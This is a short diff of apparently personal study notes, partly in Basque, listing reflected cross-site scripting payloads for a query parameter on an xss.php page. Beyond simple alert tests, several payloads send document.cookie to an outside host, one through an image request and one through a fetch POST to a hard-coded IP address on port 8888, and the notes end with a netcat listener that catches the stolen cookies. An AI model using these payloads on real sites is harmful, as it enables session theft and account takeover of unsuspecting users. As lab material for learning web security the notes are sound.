@@ -4,10 +4,11 @@
 
 http://.../xss.php?q=X
 ?q=<script>console.log('iepa')</script>
-?q=<script>alert("Hackable!")</script>
-?q=<script>alert(document.cookie)</script>
-?q=<script>new Image().src="http://[IP]:8888/bogus.php?output="+document.cookie</script>
-?q=<script>new Image().src="http://[IP]:8888/bogus.php?output=bai"</script>
+<script>alert("Hackable!")</script>
+<script>alert(document.cookie)</script>
+<script>new Image().src="http://[IP]:8888/bogus.php?output="+document.cookie</script>
+<script>new Image().src="http://[IP]:8888/bogus.php?output=bai"</script>
+<script>fetch('http://3.136.97.33:8888', {method: 'POST',mode: 'no-cors',body:document.cookie});</script>
 
 Eskaera ikusteko:
 $ nc -lvp 8888
